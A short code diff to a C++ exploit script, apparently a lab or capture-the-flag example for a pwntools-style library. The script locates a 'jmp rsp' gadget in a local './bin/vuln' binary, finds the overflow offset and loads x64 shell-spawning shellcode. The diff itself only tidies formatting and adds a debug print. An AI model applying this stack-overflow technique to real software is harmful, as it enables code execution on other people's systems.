@@ -1,7 +1,7 @@
-#include <xcraft/xcraft.hpp>
 #include <exception>
 #include <iostream>
 #include <string_view>
+#include <xcraft/xcraft.hpp>
 
 using namespace xcft;
 
@@ -9,9 +9,10 @@ using namespace xcft;
 constexpr uint32_t RIP = 0x62616162;
 
 int main(int argc, char **argv) try {
-    auto use_gdb   = argc > 1 && std::string_view(argv[1]) == "use_gdb";
-    auto elf       = ELF("./bin/vuln");
-    auto jmp_rsp   = elf.search({"jmp rsp"}).at(0);
+    auto use_gdb = argc > 1 && std::string_view(argv[1]) == "use_gdb";
+    auto elf     = ELF("./bin/vuln");
+    auto jmp_rsp = elf.search({"jmp rsp"}).at(0);
+    std::cout << jmp_rsp << std::endl;
     auto offset    = cyclic_find(RIP);
     auto shellcode = linux_sh_x64();
 
